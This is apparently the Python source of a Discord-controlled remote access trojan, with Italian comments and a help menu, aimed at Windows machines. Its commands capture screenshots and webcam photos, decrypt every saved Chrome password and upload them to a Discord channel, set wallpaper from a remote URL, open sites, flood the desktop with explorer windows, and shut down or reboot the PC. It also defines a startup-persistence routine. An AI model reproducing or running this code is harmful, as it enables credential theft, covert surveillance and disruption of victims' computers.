import discord
import os
import pyautogui
from PIL import Image
import webbrowser

intents = discord.Intents.default()
intents.message_content = True

client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f'{client.user}')
    import getpass
    import os
    USER_NAME = getpass.getuser()

    def add_to_startup(file_path=""):
        if file_path == "":
            file_path = os.path.dirname(os.path.realpath(__file__))
        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
        with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
            bat_file.write(r'start "" %s' % file_path)

@client.event
async def on_message(message):
    if message.author == client.user:
        return
    if message.content.startswith('!chrome'):
        await message.channel.send('fatto (forse)!')
        os.system('"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"')
        await message.channel.send("Fatto (forse) :skull:")
    if message.content.startswith('!screen'):
        myScreenshot = pyautogui.screenshot()
        user = os.getlogin()
        myScreenshot.save(f"C:\\Users\\{user}\\Music\\Screenshot.png")
        myfile = discord.File(f"C:\\Users\\{user}\\Music\\Screenshot.png")
        await message.channel.send(file=myfile)
        await message.channel.send("Fatto (dovrebbe esserci lo screen) :skull:")
    if message.content.startswith('!password'):
        import json
        import base64
        import sqlite3
        import shutil
        import sys
        from datetime import timezone, datetime, timedelta
        sys.stdout = open("test.txt", "w")
        # 3rd party modules
        import win32crypt
        from Crypto.Cipher import AES
        file_path = 'pass.txt'
        sys.stdout = open(file_path, "w")

        def my_chrome_datetime(time_in_mseconds):
            """Return a `datetime.datetime` object from a chrome format datetime
            Since `chromedate` is formatted as the number of microseconds since January, 1601"""
            return datetime(1601, 1, 1) + timedelta(microseconds=time_in_mseconds)

        def encryption_key():

            # C:\Users\USER_Name\AppData\Local\Google\Chrome\Local State
            localState_path = os.path.join(os.environ["USERPROFILE"],
                                           "AppData", "Local", "Google", "Chrome",
                                           "User Data", "Local State")
            # read local state file
            with open(localState_path, "r", encoding="utf-8") as file:
                local_state_file = file.read()
                local_state_file = json.loads(local_state_file)

            # decode the key and remove first 5 DPAPI str characters
            ASE_key = base64.b64decode(local_state_file["os_crypt"]["encrypted_key"])[5:]

            return win32crypt.CryptUnprotectData(ASE_key, None, None, None, 0)[1]  # decryted key

        def decrypt_password(enc_password, key):
            try:

                init_vector = enc_password[3:15]
                enc_password = enc_password[15:]

                # initialize cipher object
                cipher = AES.new(key, AES.MODE_GCM, init_vector)
                # decrypt password
                return cipher.decrypt(enc_password)[:-16].decode()
            except:
                try:
                    return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
                except:
                    return "No Passwords(logged in with Social Account)"

        def main():

            # local passwords path
            password_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                            "Google", "Chrome", "User Data", "Default", "Login Data")

            # copy the login data file to current directory as "my_chrome_data.db
            shutil.copyfile(password_db_path, "my_chrome_data.db")

            # connect to the database
            db = sqlite3.connect("my_chrome_data.db")
            cursor = db.cursor()

            # run the query
            cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")

            # get the encryption key
            encp_key = encryption_key()
            print("\n|", "-" * 50, "|\n")
            # iterate over all rows
            for row in cursor.fetchall():
                site_url = row[0]
                username = row[1]
                password = decrypt_password(row[2], encp_key)
                date_created = row[3]

                if username or password:
                    print("Sito:", site_url)
                    print("Username/Email:", username)
                    print(f"Password:", password)
                else:
                    continue
                if date_created:
                    print("Data Creazione:", str(my_chrome_datetime(date_created)))
                print("\n|", "-" * 50, "|\n")

            cursor.close()
            db.close()

            # remove the copied database after reading passwords
            os.remove("my_chrome_data.db")

        if __name__ == "__main__":
            main()
        myfile = discord.File("pass.txt")
        await message.channel.send(file=myfile)
        await message.channel.send("Fatto (forse) :skull:")
    if message.content.startswith('!fortnite'):
        webbrowser.open("fortnite.com", new=2)
        await message.channel.send("Fatto (forse) :skull:")
    if message.content.startswith('!hanime'):
        webbrowser.open("hanime.tv", new=2)
        await message.channel.send("Fatto (forse) :skull:")
    if message.content.startswith('!wallpaper'):
        link = message.content
        link2 = link.removeprefix('!wallpaper ')
        import urllib.request
        user = os.getlogin()
        urllib.request.urlretrieve(link2, f'C:/Users/{user}/Music/ddos.jpg')
        import ctypes
        path = f'C:/Users/{user}/Music/ddos.jpg'
        await message.channel.send("Fatto (forse) :skull:")
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)
        await message.channel.send("Fatto (forse) :skull:")
    if message.content.startswith('!sito'):
        link = message.content
        link2 = link.removeprefix('!sito ')
        webbrowser.open(link2, new=2)
        await message.channel.send("Fatto (forse) :skull:")
    if message.content.startswith('!foto0'):
        import time
        import cv2
        camera_port = 0
        camera = cv2.VideoCapture(camera_port)
        time.sleep(1)  # If you don't wait, the image will be dark
        return_value, image = camera.read()
        cv2.imwrite("opencv.png", image)
        del (camera)  # so that others can use the camera as soon as possible
        myfile = discord.File("opencv.png")
        await message.channel.send(file=myfile)
        await message.channel.send("Fatto (forse) :skull:")
    if message.content.startswith('!foto1'):
        import cv2
        camera_port = 2
        ramp_frames = 30
        camera = cv2.VideoCapture(camera_port)
        def get_image():
            retval, im = camera.read()
            return im
        for i in range(ramp_frames):
            temp = camera.read()
        camera_capture = get_image()
        filename = "image.jpg"
        cv2.imwrite(filename, camera_capture)
        del (camera)
        myfile = discord.File("image.jpg")
        await message.channel.send(file=myfile)
        await message.channel.send("Fatto (forse) :skull:")
    if message.content.startswith('!foto3'):
        import time
        import cv2
        camera_port = 2
        camera = cv2.VideoCapture(camera_port)
        time.sleep(1)  # If you don't wait, the image will be dark
        return_value, image = camera.read()
        cv2.imwrite("opencv3.png", image)
        del (camera)  # so that others can use the camera as soon as possible
        myfile = discord.File("opencv3.png")
        await message.channel.send(file=myfile)
    if message.content.startswith('!riavvio'):
        import os
        os.system('shutdown -r')
    if message.content.startswith('!spegni'):
        import os
        os.system('shutdown -s')
    if message.content.startswith('!crash'):
        for x in range(100):
            os.system('explorer')
    if message.content.startswith('!help'):
        embed = discord.Embed(title="Aiuto Della Rat", description="Tutti i comandi della rat", color=0x00e1ff)
        embed.add_field(name="!chrome", value="Apre Google Chrome", inline=False)
        embed.add_field(name="!screen", value="Fai uno screenshot e ricevilo qui", inline=False)
        embed.add_field(name="!password", value="Copia tutte le password del PC di Google Chrome su un file di testo",
                        inline=False)
        embed.add_field(name="!fortnite", value="Vai sul sito di Fortnite", inline=False)
        embed.add_field(name="!hanime", value="Apri il sito molto simpatico di hanime", inline=False)
        embed.add_field(name="!wallpaper",
                        value="Imposta uno sfondo usando un URL ESEMPIO: !wallpaper https://i.ytimg.com/vi/XMfoLN25FEM/maxresdefault.jpg",
                        inline=False)
        embed.add_field(name="!sito", value="Apri un sito web con Chrome ESEMPIO: !sito ddos.com", inline=False)
        embed.add_field(name="!foto0", value="Fai una foto dalla fotocamera 0", inline=False)
        embed.add_field(name="!foto1", value="Fai una foto dalla fotocamera 1", inline=False)
        embed.add_field(name="!foto2", value="Fai una foto dalla fotocamera 2", inline=False)
        embed.add_field(name="!foto3", value="Fai una foto dalla fotocamera 3", inline=False)
        embed.add_field(name="!riavvio", value="Riavvia il PC", inline=False)
        embed.add_field(name="!spegni", value="Spegni il pc", inline=False)
        embed.set_footer(text="pov ti dosso con loic 💀")
        await message.channel.send(embed=embed)





client.run(TOKENDAINSERIRE)
